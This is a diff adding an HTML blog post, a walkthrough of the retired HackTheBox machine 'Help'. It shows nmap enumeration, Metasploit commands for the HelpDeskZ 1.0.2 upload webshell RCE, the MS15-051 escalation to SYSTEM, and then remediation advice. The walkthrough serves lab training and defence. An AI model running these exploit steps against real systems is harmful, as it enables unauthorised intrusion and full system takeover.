@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Help: HelpDeskZ upload RCE and a kernel ride to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="HelpDeskZ 1.0.2 lets anonymous users upload PHP through support tickets — then an old kernel flaw finishes the climb to SYSTEM. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-14 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Help: HelpDeskZ upload RCE and a kernel ride to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Help is a retired HackTheBox easy Windows machine built on HelpDeskZ 1.0.2, a small support-ticket app on IIS. Synopsis: anonymous ticket upload becomes PHP RCE, then an old kernel flaw finishes the climb to SYSTEM.</p>
+<h2><span class="amber">$</span> Enumeration — ticket app with attachments</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: find the helpdesk</span>
+nmap -sC -sV -oN help.nmap 10.10.10.121</pre>
+<p>IIS hosting HelpDeskZ 1.0.2. The ticket form accepts file attachments with weak validation, and uploads land in a web-accessible directory. Support portals that take attachments are file-upload attack surface in a helpdesk costume.</p>
+<h2><span class="amber">$</span> Foothold — ticket upload RCE</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: helpdeskz upload exec</span>
+msfconsole -q
+msf6 &gt; use exploit/unix/webapp/helpdeskz_upload_exec
+msf6 exploit(helpdeskz_upload_exec) &gt; set RHOSTS 10.10.10.121
+msf6 exploit(helpdeskz_upload_exec) &gt; set LHOST 10.10.14.23
+msf6 exploit(helpdeskz_upload_exec) &gt; run</pre>
+<p>Submit a ticket with a PHP webshell attached; the module automates the bypass and browsing the uploaded file returns a shell as the low-privilege web user. When a form takes files, test the files first.</p>
+<h2><span class="amber">$</span> Privilege escalation — MS15-051</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: client_copy_image privesc</span>
+msf6 &gt; use exploit/windows/local/ms15_051_client_copy_image
+msf6 exploit(ms15_051_client_copy_image) &gt; set SESSION 1
+msf6 exploit(ms15_051_client_copy_image) &gt; run
+[*] Meterpreter session 2 opened as NT AUTHORITY\SYSTEM</pre>
+<p>Windows Server 2012 era plus a low shell: local_exploit_suggester points at MS15-051 (client-copy-image impersonation). Both flags fall. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>SQL injection on the ticket form for an hour (the upload is the vulnerability) and potato exploits before the kernel suggester (match the privesc to the OS generation).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Validate uploads by content outside the web root, patch kernel escalation flaws on cadence, and treat file-accepting endpoints as untrusted input. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
